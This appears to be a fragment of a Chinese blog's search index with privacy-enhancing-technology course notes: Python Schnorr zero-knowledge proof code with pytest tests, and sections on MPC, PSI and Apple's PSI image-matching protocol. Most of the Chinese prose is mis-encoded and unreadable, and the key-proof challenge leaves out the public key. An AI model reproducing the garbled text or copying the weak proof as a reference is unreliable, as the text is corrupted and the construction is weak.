$m,(c,r)$ ç»™ Verifier Verifier éªŒè¯ $H(pub,g^rpub^c,m)=c$ å¦‚æœæ”»å‡»è€…è¦ä¼ªé€ è¯æ˜ï¼Œéœ€è¦å…ˆè®¾ç½® $r,c$ å†è®¡ç®— $W$ã€‚ç„¶è€Œåœ¨ç¬¬ä¸‰æ­¥ä¸­ $c$ ä¾èµ–äº $W$ çš„å“ˆå¸Œï¼Œå› æ­¤ä¸èƒ½è¿™æ ·è®¡ç®—ã€‚ ä¸‹é¢ç”¨éäº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜æ¥è¯æ˜çŸ¥é“ DH ç§é’¥çš„ä¿¡æ¯ï¼š @pytest.mark.task1 def test_provekey_correct(): params = setup() # Correct proof priv, pub = keyGen(params) proof = proveKey(params, priv, pub) assert verifyKey(params, pub, proof) @pytest.mark.task1 def test_provekey_incorrect(): params = setup() priv, pub = keyGen(params) # Incorrect proof priv2, pub2 = keyGen(params) proof2 = proveKey(params, priv2, pub2) assert not verifyKey(params, pub, proof2) def to_challenge(elements): \"\"\" Generates a Bn challenge by hashing a number of EC points \"\"\" Cstring = b\",\".join([hexlify(x.export()) for x in elements]) Chash = sha256(Cstring).digest() return Bn.from_binary(Chash) def proveKey(params, priv, pub): \"\"\" Uses the Schnorr non-interactive protocols produce a proof of knowledge of the secret priv such that pub = priv * g. Outputs: a proof (c, r) c (a challenge) r (the response) \"\"\" G, g, hs, o = params w = o.random() W = w * g c = to_challenge([g, W]) r = w - c*priv return c, r def verifyKey(params, pub, proof): \"\"\" Schnorr non-interactive proof verification of knowledge of a secret. Returns a boolean indicating whether the verification was successful. \"\"\" G, g, hs, o = params c, r = proof gw_prime = c * pub + r * g return to_challenge([g, gw_prime]) == c ç±»ä¼¼åœ°ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥è¯æ˜å…³äºä¸€ä¸ª Commitment çš„ç¦»æ•£å¯¹æ•°è¡¨ç¤ºï¼š @pytest.mark.task2 def test_proveCommit_correct(): params = setup() # Correct proof secrets = [10, 20, 30, 40] C, r = commit(params, secrets) proof = proveCommitment(params, C, r, secrets) assert verifyCommitments(params, C, proof) @pytest.mark.task2 def test_proveCommit_incorrect(): params = setup() # Correct proof secrets = [10, 20, 30, 40] C, r = commit(params, secrets) proof = proveCommitment(params, C, r, secrets) # Incorrect proof secrets2 = [1, 20, 30, 40] C2, r2 = commit(params, secrets2) proof2 = proveCommitment(params, C2, r2, secrets2) assert not verifyCommitments(params, C, proof2) assert not verifyCommitments(params, C2, proof) def commit(params, secrets): \"\"\" Produces a commitment C = r * g + Sum xi * hi, where secrets is a list of xi of length 4. Returns the commitment (C) and the opening (r). \"\"\" assert len(secrets) == 4 G, g, (h0, h1, h2, h3), o = params x0, x1, x2, x3 = secrets r = o.random() C = x0 * h0 + x1 * h1 + x2 * h2 + x3 * h3 + r * g return C, r def proveCommitment(params, C, r, secrets): \"\"\" Prove knowledge of the secrets within a commitment, as well as the opening of the commitment. Args: C (the commitment), r (the opening of the commitment), and secrets (a list of secrets). Returns: a challenge (c) and a list of responses. \"\"\" G, g, (h0, h1, h2, h3), o = params x0, x1, x2, x3 = secrets w = o.random() w0 = o.random() w1 = o.random() w2 = o.random() w3 = o.random() W = w * g + w0 * h0 + w1 * h1 + w2 * h2 + w3 * h3 c = to_challenge([g, h0, h1, h2, h3, W]) rr = w - c*r r0 = w0 - c*x0 r1 = w1 - c*x1 r2 = w2 - c*x2 r3 = w3 - c*x3 responses = (r0, r1, r2, r3, rr) return c, responses def verifyCommitments(params, C, proof): \"\"\" Verify a proof of knowledge of the commitment. Return a boolean denoting whether the verification succeeded. \"\"\" (G, g, (h0, h1, h2, h3), o) = params c, responses = proof (r0, r1, r2, r3, rr) = responses Cw_prime = c * C + r0 * h0 + r1 * h1 + r2 * h2 + r3 * h3 + rr * g c_prime = to_challenge([g, h0, h1, h2, h3, Cw_prime]) return c_prime == c ","date":"2022-02-04","objectID":"/pet/:6:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ç›¸ç­‰æ€§è¯æ˜ å®é™…ä¸Šï¼Œé›¶çŸ¥è¯†è¯æ˜ä¸ä»…å¯ä»¥ç”¨äºè¯æ˜çŸ¥é“æŸä¸ªç§˜å¯†ï¼Œè¿˜å¯ä»¥è¯æ˜ä»»æ„å…³äºæŸä¸ªç§˜å¯†çš„é€»è¾‘è¡¨è¾¾å¼ã€‚ä»¥ç›¸ç­‰æ€§è¯æ˜ä¸ºä¾‹ï¼Œå‡å¦‚æœ‰ $P_1=g^x,P_2=h^x$ï¼Œ$g,h$ æ˜¯ç¾¤ $G$ çš„ç”Ÿæˆå…ƒï¼Œè€Œ Prover æƒ³è¯æ˜ä¸¤ä¸ª $x$ ç›¸ç­‰ï¼Œé‚£ä¹ˆå¯ä»¥ç»“åˆ 2 æ¬¡ Schnorr åè®®ï¼Œé‡‡ç”¨ Fiat-Shamir æŠ€æœ¯å®ç° NIKPã€‚ Prover é€‰æ‹©éšæœº $w$ï¼Œ$W_1=g^w,W_2=h^w$ è®¡ç®— $c=H(g,h,P_1,P_2,W_1,W_2)$ï¼Œ$r=w-cx$ï¼Œå‘é€ $(c,r)$ ç»™ Verifier Verifier éªŒè¯ $H(g,h,P_1,P_2,g^rP_1^c,h^rP_2^c)=c$ @pytest.mark.task3 def test_proveEquality_correct(): params = setup() x, K, L = gen2Keys(params) proof = proveDLEquality(params, x, K, L) assert verifyDLEquality(params, K, L, proof) @pytest.mark.task3 def test_proveEquality_incorrect(): params = setup() x, K, L = gen2Keys(params) _, _, L2 = gen2Keys(params) proof = proveDLEquality(params, x, K, L) assert not verifyDLEquality(params, K, L2, proof) def gen2Keys(params): \"\"\" Generate two related public keys K = x * g and L = x * h0. \"\"\" G, g, (h0, h1, h2, h3), o = params x = o.random() K = x * g L = x * h0 return x, K, L def proveDLEquality(params, x, K, L): \"\"\" Generate a ZK proof that two public keys K, L have the same secret private key x, as well as knowledge of this private key. \"\"\" G, g, (h0, h1, h2, h3), o = params w = o.random() Kw = w * g Lw = w * h0 c = to_challenge([g, h0, Kw, Lw]) r = (w - c * x) % o return c, r def verifyDLEquality(params, K, L, proof): \"\"\" Return whether the verification of equality of two discrete logarithms succeeded. \"\"\" G, g, (h0, h1, h2, h3), o = params c, r = proof k_prime = c*K + r*g l_prime = c*L + r*h0 return to_challenge([g, h0, k_prime, l_prime]) == c ","date":"2022-02-04","objectID":"/pet/:6:3","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"å®‰å…¨å¤šæ–¹è®¡ç®— MPC åœ¨å®‰å…¨å¤šæ–¹è®¡ç®—ä¸­ï¼Œå¤šä¸ªå®ä½“å¸Œæœ›èƒ½åˆ©ç”¨è‡ªå·±ç§æœ‰çš„è¾“å…¥ä¸€èµ·è®¡ç®—å‡ºä¸€ä¸ªè¾“å‡ºï¼Œä½†ä¸å¸Œæœ›æ³„éœ²ç§æœ‰è¾“å…¥çš„ä¿¡æ¯ã€‚ ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨ MPC çš„ä¾‹å­æ˜¯ Oblivious Transferï¼Œæ­¤æ—¶å‘é€è€…æ‹¥æœ‰å¤šä¸ªä¿¡æ¯ï¼Œæ¥æ”¶è€…å‘é€ä¸€ä¸ªæ•°å€¼ bï¼Œæ­¤æ—¶å‘é€è€…çš„å…¶ä¸­ä¸€æ¡ä¿¡æ¯ï¼ˆä¾‹å¦‚ä¸‹æ ‡ä¸º b çš„ä¿¡æ¯ï¼‰ä¼šè¢«å‘é€ç»™æ¥æ”¶è€…ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå‘é€è€…ä¸çŸ¥é“ bï¼Œæ¥æ”¶è€…ä¹Ÿä¸çŸ¥é“å…¶ä»–æ²¡æ¥æ”¶åˆ°çš„ä¿¡æ¯ã€‚å…¶ä»– MPC ç›¸å…³ä¾‹å­åŒ…æ‹¬ E-Votingã€Proof-of-Stakeã€ç§æœ‰é›†åˆäº¤é›†ç­‰ç­‰ã€‚ ","date":"2022-02-04","objectID":"/pet/:7:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"å®‰å…¨å®šä¹‰ å­˜åœ¨ä¸¤ç§æ–¹æ³•æ¥å¯¹ä¸€ä¸ªåè®®çš„å®‰å…¨ä½œå‡ºå®šä¹‰ï¼šå¯å‘å¼æ–¹æ³•å’Œä¸¥è°¨æ–¹æ³•ã€‚å‰è€…å°è¯•å¯¹åè®®è¿›è¡Œæ”»å‡»ï¼Œå¦‚æœæ”»å‡»æˆåŠŸåˆ™æ”¹è¿›åè®®ï¼Œç›´åˆ°æ— æ³•æ”»å‡»ä¸ºæ­¢ã€‚è¿™ç§æ–¹æ³•æ— æ³•è€ƒè™‘åˆ°æ‰€æœ‰æ”»å‡»ã€æˆ–æ˜¯æœªæ¥çš„æ–°çš„æ”»å‡»ï¼Œå› æ­¤å¹¶ä¸æ¨èã€‚ä¸¥è°¨æ–¹æ³•åˆ™å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹æ­¥éª¤ï¼š å®šä¹‰æ”»å‡»è€…çš„ç±»å‹å’Œèƒ½åŠ› è¢«åŠ¨ / ä¸»åŠ¨ï¼Ÿ è®¡ç®—èƒ½åŠ›æœ‰é™ / æ— é™ï¼Ÿ èƒ½å¦ä¸ç³»ç»Ÿä¸­å…¶ä»–å®ä½“åˆä½œï¼Ÿ å®šä¹‰ç½‘ç»œæ¨¡å‹ å®ä½“é—´é€šä¿¡æ˜¯å¦ä½¿ç”¨å®‰å…¨ä¿¡é“ï¼Ÿ æ”»å‡»è€…èƒ½å¦ä¿®æ”¹æ¶ˆæ¯é¡ºåºï¼Ÿ å®šä¹‰â€œå®‰å…¨â€çš„è¯­ä¹‰ é€šè¿‡æ¸¸æˆå®šä¹‰ï¼ˆå¯†ç å­¦å¸¸ç”¨æ–¹æ³•ï¼‰ é€šè¿‡æ¨¡æ‹Ÿå®šä¹‰ï¼ˆMPC æ‰€ç”¨çš„æ–¹æ³•ï¼‰ è®¾è®¡åè®® è¯æ˜åè®®åœ¨ä¸Šè¿°æ¡ä»¶ä¸‹æ˜¯å®‰å…¨çš„ æ¸¸æˆå®šä¹‰çš„å®‰å…¨æˆ‘ä»¬åœ¨å¯†ç å­¦ä¸­å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œè€Œæ¨¡æ‹Ÿå®šä¹‰çš„å®‰å…¨åˆ™åŸºäºä¸¤ä¸ªæ¨¡å‹ï¼šç†æƒ³æ¨¡å‹å’Œç°å®æ¨¡å‹ã€‚åœ¨ç†æƒ³æ¨¡å‹ä¸­ï¼Œå‚ä¸è€…å°†è¾“å…¥å‘é€ç»™ä¸€ä¸ªå¯ä¿¡ç¬¬ä¸‰æ–¹ï¼Œç”±å®ƒæ¥è®¡ç®—ç»“æœå¹¶è¾“å‡ºï¼›è€Œåœ¨ç°å®æ¨¡å‹ä¸­ï¼Œç”±äºå¹¶ä¸å­˜åœ¨è¿™æ ·çš„ TTPï¼Œä¼šå®é™…è¿è¡Œè¿™ä¸ª MPC åè®®æ¥è·å¾—è¾“å‡ºã€‚ å¦‚æœä»»æ„é’ˆå¯¹ç°å®æ¨¡å‹çš„æ”»å‡»éƒ½åŒæ ·èƒ½é’ˆå¯¹ç†æƒ³æ¨¡å‹ï¼Œé‚£ä¹ˆåè®®å°±æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºç†æƒ³æ¨¡å‹ä¸‹æ— æ³•å¼€å±•æ”»å‡»ã€‚è¿™é‡Œç”¨äº†ä¸€ç‚¹åè¯æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯å¯†ç å­¦ä¸­å¸¸ç”¨çš„é‚£ç§å¥—å£³å½’çº¦çš„æ–¹æ³•ï¼ˆç»å…¸ä¾‹å­ï¼šå°† DH å¯†é’¥äº¤æ¢åè®®å½’çº¦åˆ° DDH é—®é¢˜ä¸Šï¼‰ã€‚ä¸€è¨€ä»¥è”½ä¹‹ï¼Œå¦‚æœæ”»å‡»è€…æ— æ³•åŒºåˆ†å®ƒå¤„äºç†æƒ³æ¨¡å‹ä¸­è¿˜æ˜¯ç°å®æ¨¡å‹ä¸­ï¼Œé‚£ä¹ˆåè®®å°±æ˜¯å®‰å…¨çš„ã€‚ ","date":"2022-02-04","objectID":"/pet/:7:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"æ¶‰åŠæŠ€æœ¯ åŒæ€åŠ å¯† å…¨åŒæ€åŠ å¯†ï¼ˆæ”¯æŒä»»æ„è¿ç®—ï¼Œå¼€é”€è¾ƒå¤§ï¼‰ éƒ¨åˆ†åŒæ€åŠ å¯† Commitment Scheme ç§˜å¯†åˆ†äº« å¯ä¿¡æ‰§è¡Œç¯å¢ƒ TEE åŒºå—é“¾ ","date":"2022-02-04","objectID":"/pet/:7:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ç§æœ‰é›†åˆäº¤é›† PSI é¡¾åæ€ä¹‰ï¼ŒPSI æ—¨åœ¨è®¡ç®—å¤šä¸ªé›†åˆçš„äº¤é›†è€Œä¸æ³„éœ²é›†åˆçš„ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæŠŠæ¯ä¸ªå‚ä¸è€…çš„ç§æœ‰é›†åˆä½œä¸ºè¾“å…¥ï¼Œé›†åˆäº¤é›†ä½œä¸ºè¿ç®—ï¼Œé‚£ä¹ˆ PSI å°±æ˜¯ MPC çš„ä¸€ç§ç‰¹ä¾‹ã€‚é¢å¯¹è¢«åŠ¨æ”»å‡»è€…æ—¶ï¼ŒPSI åªéœ€è¦æ»¡è¶³æœºå¯†æ€§å³å¯ï¼›è€Œé¢å¯¹ä¸»åŠ¨æ”»å‡»è€…ï¼ŒPSI éœ€è¦ç¡®ä¿äº¤é›†è¿ç®—çš„ç»“æœæ­£ç¡®ï¼Œå³èƒ½æ£€æµ‹å¯¹ç»“æœçš„ç¯¡æ”¹ã€‚ ","date":"2022-02-04","objectID":"/pet/:8:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"æ¶‰åŠæŠ€æœ¯ å®‰å…¨æ€§ åŒæ€åŠ å¯† è¡¨ç¤ºä¸ºæœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ $p(x)=\\Sigma_{i=1}^d(x-s_i)\\ for\\ S={s_1,â€¦,s_d}$ å¤šé¡¹å¼çš„æ ¹å³é›†åˆå…ƒç´ ï¼Œå¤šé¡¹å¼ä¹‹å’Œçš„æ ¹å³ä¸ºäº¤é›†ï¼ˆæˆ–æ±‚ GCDï¼‰ å¯¹äº d æ¬¡å¤šé¡¹å¼ $p_A,p_B$ï¼ˆä»£è¡¨ $S^{(A)},S^{(B)}$ï¼‰ï¼Œä»¥åŠéšæœºçš„ d æ¬¡å¤šé¡¹å¼ $\\gamma_A,\\gamma_B$ï¼Œä»¤ $\\theta=\\gamma_A\\cdot p_A+\\gamma_B\\cdot p_B=\\mu\\cdot gcd(p_A,p_B)$ï¼Œ$\\mu$ ä¸ºéšæœºå¤šé¡¹å¼ï¼Œæ­¤æ—¶ $\\theta$ ä»…åŒ…å« $S^{(A)}\\cap S^{(B)}$ çš„ä¿¡æ¯è€Œä¸åŒ…å«ä»»ä¸€é›†åˆå…¶ä½™å…ƒç´ çš„ä¿¡æ¯ å“ˆå¸Œå‡½æ•° ä¼ªéšæœºå‡½æ•° æ€§èƒ½ æ•°æ®ç»“æ„ å“ˆå¸Œè¡¨ï¼šå°†é›†åˆå…ƒç´ å“ˆå¸Œåˆ°è¡¨ä¸­ï¼Œåœ¨è¡¨ä¸Šè®¡ç®— å¸ƒéš†è¿‡æ»¤å™¨ï¼šçŠ¶æ€å‹ç¼©åè¿›è¡Œä¼ è¾“å’Œè®¡ç®— å°† ZKP æ›¿æ¢ä¸ºä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå¦‚åœ¨è¾“å…¥ä¸­è®¾ç½®é™·é˜±æ¥é˜²ç¯¡æ”¹ Horner æ–¹æ³• ","date":"2022-02-04","objectID":"/pet/:8:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"åˆ†ç±» åœ¨ä¼ ç»Ÿ PSI ä¸­ï¼Œå‚ä¸è€…äº¤äº’å¼åœ°æ‰§è¡Œåè®®ä»¥è®¡ç®—ç»“æœï¼Œæ¯æ¬¡è®¡ç®—éƒ½è¦ä½¿ç”¨æœ¬åœ°çš„é›†åˆæ•°æ®ã€‚ç„¶è€Œåœ¨å§”æ‰˜å¼ PSI ä¸­ï¼Œå‚ä¸è€…å¯ä»¥å°†æ•°æ®ç¼–ç åä¸Šä¼ è‡³äº‘æœåŠ¡å•†ï¼Œå§”æ‰˜äº‘æœåŠ¡å•†è¿›è¡Œ PSI è®¡ç®—ï¼šè¿™ç§å§”æ‰˜å¯ä»¥æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå³æ¯æ¬¡è®¡ç®—éƒ½è¦é‡æ–°å°†æ•°æ®ç¼–ç ä¸Šä¼ ï¼›ä¹Ÿå¯ä»¥æ˜¯é‡å¤çš„ï¼Œä¸€æ¬¡ä¸Šä¼ å¤šæ¬¡ä½¿ç”¨ã€‚ ","date":"2022-02-04","objectID":"/pet/:8:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"åº”ç”¨åœºæ™¯ åœ¨çº¿æ¸¸æˆä½œå¼Šæ£€æµ‹ ç–«æƒ…æ¥è§¦è€…è¿½è¸ª Chrome æ‰©å±•æ£€æŸ¥å¯†ç æ˜¯å¦åœ¨æ³„éœ²æ•°æ®åº“ä¸­ SNS æŸ¥æ‰¾å…±åŒå¥½å‹ ","date":"2022-02-04","objectID":"/pet/:8:3","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ğŸŒ° Apple PSI Apple ä½¿ç”¨ PSI æŠ€æœ¯æ¥æ£€æµ‹ç”¨æˆ·çš„ iCloud ä¸­æ˜¯å¦å­˜å‚¨äº†éæ³•çš„å„¿ç«¥è‰²æƒ…å›¾ç‰‡ï¼ŒåŒæ—¶é¿å…æ³„éœ²ç”¨æˆ· iCloud ä¸­çš„æ­£å¸¸å›¾ç‰‡ã€‚ å‡è®¾ $X$ æ˜¯æœåŠ¡å™¨ä¸­éæ³•å›¾ç‰‡çš„å“ˆå¸Œå€¼é›†åˆï¼Œå®¢æˆ·ç«¯ä¸­çš„å›¾ç‰‡é›†åˆå¯ä»¥ç”¨ $Y=((y_1,id_1,ad_1),â€¦,(y_m,id_m,ad_m))$ï¼Œå…¶ä¸­ $id$ æ˜¯æ¯ä¸ªå…ƒç´ çš„æ ‡è¯†ç¬¦ï¼Œ$y$ æ˜¯è¯¥å›¾ç‰‡çš„å“ˆå¸Œå€¼ï¼Œ$ad$ æ˜¯é™„åŠ ä¿¡æ¯ã€‚ç°åœ¨ï¼Œå¦‚æœå®¢æˆ·ç«¯æ‹¥æœ‰è¶…è¿‡é˜ˆå€¼ $t$ å¼ ç…§ç‰‡æ»¡è¶³å…¶å¯¹åº”çš„ $y_i$ ä½äº $X$ é›†åˆä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›èƒ½è·å¾—æ‰€æœ‰çš„å¯¹åº”çš„ $(id_i,ad_i)$ é›†åˆã€‚ ä¾‹å¦‚ï¼Œ$X=(y_1,y_2,y_3,y_4,y_5),Y=((y_1,id_1,ad_1),(y_3,id_3,ad_3),(y_8,id_8,ad_8)),t=1$ï¼Œç”±äºç¬¦åˆæ¡ä»¶çš„ç…§ç‰‡æ•°è¶…è¿‡äº†é˜ˆå€¼ 1ï¼ŒæœåŠ¡å™¨åº”è¯¥èƒ½ä¸”åªèƒ½æ”¶åˆ° $(id_1,ad_1),(id_3,ad_3)$ï¼Œå¹¶ä¸”æ— æ³•è·å¾—ä»»ä½•å…³äº $(y_8,id_8,ad_8)$ çš„ä¿¡æ¯ã€‚ é‚£ä¹ˆè¿™ä¸€ç›®æ ‡æ˜¯å¦‚ä½•è¾¾åˆ°çš„å‘¢ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ï¼š å“ˆå¸Œè¡¨ $T$ï¼Œå…¶å¯¹åº”çš„å“ˆå¸Œå‡½æ•°æ˜¯ $h$ï¼Œå®¹é‡ä¸º $n'$ å¯†é’¥ç”Ÿæˆå‡½æ•° $H'$ å¯¹ç§°åŠ å¯†æœºåˆ¶ $(Enc,Dec)$ å¦ä¸€ä¸ªå“ˆå¸Œå‡½æ•° $H$ é˜ˆå€¼ä¸º t çš„ç§˜å¯†åˆ†äº«æœºåˆ¶ï¼šè‡³å°‘éœ€è¦ t+1 ä»½ç§˜å¯†ç¢ç‰‡æ‰èƒ½é‡å»ºç§˜å¯† æ•´ä¸ªåè®®æ˜¯è¿™æ ·è¿è¡Œçš„ï¼š æœåŠ¡ç«¯æ ¹æ® $X$ è®¡ç®—å‡º pdata å’ŒæœåŠ¡ç«¯å¯†é’¥ï¼Œå‘é€ pdata ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ£€æŸ¥ pdata ä¸­å…ƒç´ ä¸¤ä¸¤ä¸åŒä¸”éç©ºï¼Œç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥ adkey å®¢æˆ·ç«¯åˆ©ç”¨å®¢æˆ·ç«¯å¯†é’¥ã€pdataã€å®¢æˆ·ç«¯çš„ä¸€å¼ ç…§ç‰‡è®¡ç®—å‡ºå¯¹åº”çš„ voucher å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨åˆ©ç”¨æœåŠ¡ç«¯å¯†é’¥ã€voucher è®¡ç®—å‡ºæœ€ç»ˆç»“æœ åœ¨ç¬¬ä¸€æ­¥ä¸­ï¼ŒæœåŠ¡å™¨å…ˆå°† $X$ ä¸­çš„å€¼æ’å…¥åˆ° $T$ ä¸­ï¼Œé€‰æ‹©éšæœºå€¼ $\\alpha$ å’Œæœ‰é™åŸŸç”Ÿæˆå…ƒ $G$ï¼Œè®¡ç®— $L=G^\\alpha$ï¼ˆä¸ºäº†éšè— $\\alpha$ï¼Œç±»ä¼¼éå¯¹ç§°å¯†ç ï¼‰ã€‚å¯¹äºæ¯ä¸ª $T$ ä¸­å…ƒç´ ï¼Œå¦‚æœè¯¥å…ƒç´ éç©ºï¼Œè®¡ç®— $P_i=(H(T[i]))^\\alpha$ï¼›å¦åˆ™ï¼Œè®¾ç½® $P_i$ ä¸ºéšæœºå€¼ã€‚æœ€åï¼Œpdata è¢«è®¾ç½®ä¸º $(L,P_1,â€¦,P_{nâ€™})$ å¹¶å‘é€ã€‚ åˆ°äº†ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ç«¯é¦–å…ˆåŠ å¯†é™„åŠ ä¿¡æ¯ï¼š$adct=Enc_{adkey}(ad)$ï¼Œç”Ÿæˆ $adkey$ çš„ç§˜å¯†ç¢ç‰‡ $sh$ï¼Œéšåéšæœºé€‰æ‹©æ–°çš„å¯†é’¥ $rkey$ï¼Œè®¡ç®— $rct=Enc_{rkey}((adct,sh))$ã€‚ æ¥ä¸‹æ¥ï¼Œå®¢æˆ·ç«¯éœ€è¦å¯¹è¿™å¼ ç…§ç‰‡çš„ $y$ è¿›è¡Œç¼–ç ï¼Œé¦–å…ˆå†³å®šå…¶åœ¨å“ˆå¸Œè¡¨çš„ä½ç½®ï¼š$w=h(y)$ï¼ŒéšååŠ å¯† $y$ å¾—åˆ° $Q$ å¹¶ç”Ÿæˆ tag $S$ï¼šé€‰æ‹©éšæœºçš„ $\\beta,\\gamma$ï¼Œè®¡ç®— $Q=(H(y))^\\beta\\cdot G^\\gamma$ã€‚ä» pdata ä¸­å– $P_w,L$ï¼Œè®¡ç®— $S=(P_w)^\\beta\\cdot L^\\gamma$ã€‚æ¥ç€ç”Ÿæˆæ–°å¯†é’¥ $Sâ€™=Hâ€™(S)$ï¼Œç”¨æ¥åŠ å¯† $rkey$ï¼š$ct=Enc_{Sâ€™}(rkey)$ã€‚æœ€åï¼Œvoucher è¢«è®¾ç½®ä¸º $(id,Q,ct,rct)$ å¹¶å‘é€ã€‚ ç¬¬å››æ­¥ï¼ŒæœåŠ¡å™¨é¦–å…ˆåˆå§‹åŒ–ç©ºåˆ—è¡¨ SHARESã€‚ä» voucher ä¸­è¯»å– $Q$ï¼Œè®¡ç®— $\\hat{S}=Q^\\alpha$ã€‚ å¦‚æœç…§ç‰‡åœ¨ $X$ ä¸­ï¼Œé‚£ä¹ˆ $\\hat{S}=Q^\\alpha=(H(y))^{\\beta\\alpha}\\cdot G^{\\gamma\\alpha}=(P_w)^\\beta\\cdot L^\\gamma=S$ã€‚ ç„¶åï¼ŒæœåŠ¡å™¨ç”Ÿæˆæ–°å¯†é’¥ $\\hat{Sâ€™}=Hâ€™(\\hat{S})$ï¼Œæå– $rkey=Dec_{\\hat{Sâ€™}}(ct)$ï¼Œå¦‚æœè§£å¯†å¤±è´¥åˆ™ä¸­æ­¢ã€‚ä¸‹ä¸€æ­¥åˆ™æ˜¯æå– $adct$ å’Œ $sh$ï¼Œåªéœ€è¦ $(adct,sh)=Dec_{rkey}(rct)$ï¼Œå¦‚æœè§£å¯†å¤±è´¥åŒæ ·ä¸­æ­¢ã€‚è§£å¯†å®Œæˆåï¼Œå°† $(id,adct,sh)$ åŠ å…¥åˆ° SHARES ä¸­ã€‚æ­¤æ—¶æˆ‘ä»¬æˆåŠŸåŒ¹é…åˆ°äº†éæ³•å›¾ç‰‡ã€‚ å¦‚æœ SHARES ä¸­å­˜åœ¨è‡³å°‘ t+1 ä»½ç¢ç‰‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥é‡å»º $adkey$ äº†ã€‚æœ€åä¸€æ­¥å°±æ˜¯åˆ©ç”¨ $adkey$ æå– $ad$ï¼š$ad=Dec_{adkey}(adct)$ã€‚ ","date":"2022-02-04","objectID":"/pet/:8:4","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["æ¢ç´¢"],"content":"COMP0133ã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹æ˜¯æˆ‘ä»æœ¬ç§‘åˆ°ç¡•å£«æœŸé—´æœ€æœ‰ä»·å€¼çš„è¯¾ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:0:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åº æˆ‘æœ€åˆå› ä¸ºé€‰äº†ã€Šæ¶æ„è½¯ä»¶ã€‹è¿™é—¨è¯¾ï¼Œæ²¡æ•¢é€‰åŒä¸€å­¦æœŸåŒæ ·ç¡¬æ ¸çš„ã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹ã€‚åæ¥ä¸€æ–¹é¢æ˜¯å› ä¸ºã€Šæ¶æ„è½¯ä»¶ã€‹è¿‡äºå½¢å¼åŒ–ã€ä¸€æ–¹é¢æ˜¯å› 